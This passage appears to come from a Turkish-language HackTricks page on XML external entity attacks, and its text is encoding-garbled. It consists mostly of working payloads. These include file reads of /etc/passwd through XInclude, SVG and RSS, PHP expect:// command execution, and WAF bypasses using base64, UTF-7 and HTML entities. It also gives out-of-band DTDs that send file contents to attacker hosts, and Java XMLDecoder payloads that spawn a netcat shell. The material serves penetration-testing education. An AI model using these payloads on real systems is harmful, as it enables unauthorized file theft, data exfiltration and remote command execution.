Bir `XInclude` saldÄ±rÄ±sÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in, `XInclude` ad alanÄ±nÄ±n bildirilmesi ve amaÃ§lanan harici varlÄ±ÄŸÄ±n dosya yolu belirtilmelidir. AÅŸaÄŸÄ±da, bÃ¶yle bir saldÄ±rÄ±nÄ±n nasÄ±l formÃ¼le edilebileceÄŸine dair Ã¶zlÃ¼ bir Ã¶rnek bulunmaktadÄ±r:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Daha fazla bilgi iÃ§in [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) adresini kontrol edin!

### SVG - Dosya YÃ¼kleme

KullanÄ±cÄ±lar tarafÄ±ndan belirli uygulamalara yÃ¼klenen dosyalar, daha sonra sunucuda iÅŸlenirken XML veya XML iÃ§eren dosya biÃ§imlerinin nasÄ±l iÅŸlendiÄŸindeki gÃ¼venlik aÃ§Ä±klarÄ±nÄ± sÃ¶mÃ¼rebilir. Ofis belgeleri (DOCX) ve resimler (SVG) gibi yaygÄ±n dosya biÃ§imleri XML'e dayanmaktadÄ±r.

KullanÄ±cÄ±lar **resim yÃ¼klediÄŸinde**, bu resimler sunucu tarafÄ±ndan iÅŸlenir veya doÄŸrulanÄ±r. PNG veya JPEG gibi biÃ§imler bekleyen uygulamalar iÃ§in bile, **sunucunun resim iÅŸleme kÃ¼tÃ¼phanesi SVG resimleri de destekleyebilir**. XML tabanlÄ± bir biÃ§im olan SVG, saldÄ±rganlarÄ±n kÃ¶tÃ¼ niyetli SVG resimleri gÃ¶ndererek sunucuyu XXE (XML DÄ±ÅŸ VarlÄ±k) gÃ¼venlik aÃ§Ä±klarÄ±na maruz bÄ±rakmasÄ±na neden olabilir.

Bu tÃ¼r bir saldÄ±rÄ±nÄ±n bir Ã¶rneÄŸi aÅŸaÄŸÄ±da gÃ¶sterilmektedir, kÃ¶tÃ¼ niyetli bir SVG resminin sistem dosyalarÄ±nÄ± okumaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
BaÅŸka bir yÃ¶ntem, PHP "expect" sarmalayÄ±cÄ±sÄ± aracÄ±lÄ±ÄŸÄ±yla **komutlarÄ± yÃ¼rÃ¼tmeye Ã§alÄ±ÅŸmaktÄ±r**:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
Her iki durumda da SVG formatÄ±, sunucunun yazÄ±lÄ±mÄ±nÄ±n XML iÅŸleme yeteneklerini sÃ¶mÃ¼ren saldÄ±rÄ±larÄ± baÅŸlatmak iÃ§in kullanÄ±lÄ±r, saÄŸlam giriÅŸ doÄŸrulamasÄ± ve gÃ¼venlik Ã¶nlemlerinin gerekliliÄŸini vurgular.

Daha fazla bilgi iÃ§in [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)'i kontrol edin!

**Dosya yÃ¼kleme - PDF**

Bir PDF dosyasÄ± yÃ¼kleyerek bir XXE'yi nasÄ±l sÃ¶mÃ¼rÃ¼leceÄŸini Ã¶ÄŸrenmek iÃ§in aÅŸaÄŸÄ±daki yazÄ±yÄ± okuyun:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: x-www-urlencoded'dan XML'e

Bir POST isteÄŸi XML formatÄ±nda veri kabul ediyorsa, o istekte bir XXE'yi sÃ¶mÃ¼rmeyi deneyebilirsiniz. Ã–rneÄŸin, normal bir istek aÅŸaÄŸÄ±dakileri iÃ§eriyorsa:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Sonra aÅŸaÄŸÄ±daki isteÄŸi gÃ¶nderebilirsiniz, aynÄ± sonuÃ§la:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: JSON'dan XEE'ye

Ä°steÄŸi deÄŸiÅŸtirmek iÃ§in "Content Type Converter" adlÄ± bir Burp Eklentisini kullanabilirsiniz. Bu Ã¶rneÄŸi [buradan](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) bulabilirsiniz:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
BaÅŸka bir Ã¶rnek [burada](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2) bulunabilir.

## WAF & Koruma AtlatmalarÄ±

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
Bu sadece XML sunucusunun `data://` protokolÃ¼nÃ¼ kabul ettiÄŸi durumlarda Ã§alÄ±ÅŸÄ±r.

### UTF-7

UTF-7'yi kullanabilirsiniz. \[**"Encode Recipe**" of cyberchef here ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) UTF-7'ye dÃ¶nÃ¼ÅŸtÃ¼rÃ¼n.
```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### Dosya:/ ProtokolÃ¼ Atlatma

EÄŸer web PHP kullanÄ±yorsa, `file:/` yerine **php sarmallarÄ±** `php://filter/convert.base64-encode/resource=` kullanarak **dahili dosyalara eriÅŸebilirsiniz**.

EÄŸer web Java kullanÄ±yorsa [**jar: protokolÃ¼nÃ¼**](xxe-xee-xml-external-entity.md#jar-protocol) kontrol edebilirsiniz.

### HTML VarlÄ±klarÄ±

[**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes) adresinden bir hile\
**Html varlÄ±klarÄ±** ile kodlayarak bir **varlÄ±k iÃ§inde varlÄ±k** oluÅŸturabilir ve ardÄ±ndan bir **dtd yÃ¼klemek** iÃ§in onu Ã§aÄŸÄ±rabilirsiniz.\
KullanÄ±lan **HTML VarlÄ±klarÄ±nÄ±n** **sayÄ±sal** olmasÄ± gerektiÄŸini unutmayÄ±n (Ã¶rneÄŸin \[bu Ã¶rnekte]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTD Ã¶rneÄŸi:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP SarfÄ±rlarÄ±

### Base64

**Ã‡Ä±kart** _**index.php**_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Harici kaynaÄŸÄ± Ã§Ä±kartma**
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Uzak kod yÃ¼rÃ¼tme

**EÄŸer PHP "expect" modÃ¼lÃ¼ yÃ¼klenmiÅŸse**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**

## **SOAP - XEE**
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Bu Ã¶rnek [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe) adresinden esinlenilmiÅŸtir.

XLIFF (XML Localization Interchange File Format), yerelleÅŸtirme sÃ¼reÃ§lerinde veri deÄŸiÅŸimini standartlaÅŸtÄ±rmak iÃ§in kullanÄ±lÄ±r. YerelleÅŸtirilebilir verilerin yerelleÅŸtirme araÃ§larÄ± arasÄ±nda transferi iÃ§in kullanÄ±lan, CAT (Computer-Aided Translation) araÃ§larÄ± iÃ§in ortak bir deÄŸiÅŸim formatÄ± olarak XML tabanlÄ± bir formattÄ±r.

### KÃ¶r Ä°stek Analizi

AÅŸaÄŸÄ±daki iÃ§erikle sunucuya bir istek yapÄ±lÄ±r:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Ancak, bu istek iÃ§ sunucu hatasÄ± tetikler ve Ã¶zellikle iÅŸaretleme beyanlarÄ± ile ilgili bir sorundan bahseder:
```json
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
Hata olmasÄ±na raÄŸmen, Burp Collaborator'da bir vuruÅŸ kaydedilir ve dÄ±ÅŸ varlÄ±kla bir tÃ¼r etkileÅŸim olduÄŸunu gÃ¶sterir.

Veri DÄ±ÅŸarÄ± Aktarma DÄ±ÅŸ BandÄ±ndan veri dÄ±ÅŸarÄ± aktarmak iÃ§in deÄŸiÅŸtirilmiÅŸ bir istek gÃ¶nderilir:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Bu yaklaÅŸÄ±m, KullanÄ±cÄ± AjanÄ±nÄ±n Java 1.8'in kullanÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶sterdiÄŸini ortaya koyuyor. Bu Java sÃ¼rÃ¼mÃ¼nÃ¼n bir kÄ±sÄ±tlamasÄ±, Out of Band tekniÄŸi kullanÄ±larak /etc/passwd gibi bir satÄ±r sonu karakteri iÃ§eren dosyalarÄ±n alÄ±namamasÄ±dÄ±r.

Hata TabanlÄ± Veri SÄ±zdÄ±rma Bu kÄ±sÄ±tlamayÄ± aÅŸmak iÃ§in Hata TabanlÄ± bir yaklaÅŸÄ±m kullanÄ±lÄ±r. Hedef dosyadan veri iÃ§eren bir hatayÄ± tetiklemek iÃ§in DTD dosyasÄ± aÅŸaÄŸÄ±daki gibi yapÄ±landÄ±rÄ±lmÄ±ÅŸtÄ±r:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
Sunucu bir hata ile yanÄ±t verir, Ã¶nemli olan olmayan bir dosyayÄ± yansÄ±tarak, sunucunun belirtilen dosyaya eriÅŸmeye Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± gÃ¶sterir:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Hata mesajÄ±nda dosyanÄ±n iÃ§eriÄŸini dahil etmek iÃ§in DTD dosyasÄ± ayarlanÄ±r:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Bu deÄŸiÅŸiklik, HTTP aracÄ±lÄ±ÄŸÄ±yla gÃ¶nderilen hata Ã§Ä±ktÄ±sÄ±nda yansÄ±tÄ±ldÄ±ÄŸÄ± gibi dosyanÄ±n iÃ§eriÄŸinin baÅŸarÄ±lÄ± bir ÅŸekilde dÄ±ÅŸa aktarÄ±lmasÄ±na yol aÃ§ar. Bu, hassas bilgileri Ã§Ä±karmak iÃ§in Hem BaÄŸlam DÄ±ÅŸÄ± Hem de Hata TabanlÄ± teknikleri kullanan baÅŸarÄ±lÄ± bir XXE (XML DÄ±ÅŸsal VarlÄ±k) saldÄ±rÄ±sÄ±nÄ± gÃ¶sterir.

## RSS - XEE

XXE zafiyetini sÃ¶mÃ¼rmek iÃ§in RSS formatÄ±ndaki geÃ§erli XML.

### Geri Bildirim

SaldÄ±rganÄ±n sunucusuna basit bir HTTP isteÄŸi
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Dosya okuma
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Kaynak kodunu oku

PHP base64 filtresi kullanarak
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE to RCE

XMLDecoder, bir XML mesajÄ±na dayalÄ± nesneler oluÅŸturan bir Java sÄ±nÄ±fÄ±dÄ±r. KÃ¶tÃ¼ niyetli bir kullanÄ±cÄ±, bir uygulamanÄ±n **readObject** yÃ¶ntemine keyfi verileri kullanmasÄ±nÄ± saÄŸlayabilirse, sunucuda anÄ±nda kod yÃ¼rÃ¼tme yetkisine sahip olacaktÄ±r.

### Runtime().exec() KullanÄ±mÄ±
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder

### ProcessBuilder
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## AraÃ§lar

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## Referanslar

* [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\\
* [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\\
* Kendi harici DTD'sini kullanarak HTTP aracÄ±lÄ±ÄŸÄ±yla bilgi Ã§Ä±karma: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\\
* [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\\
* [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\\
* [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\\
* [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olacak ÅŸekilde AWS hacklemeyi Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini alÄ±n**](https://peass.creator-spring.com)
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'ler gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
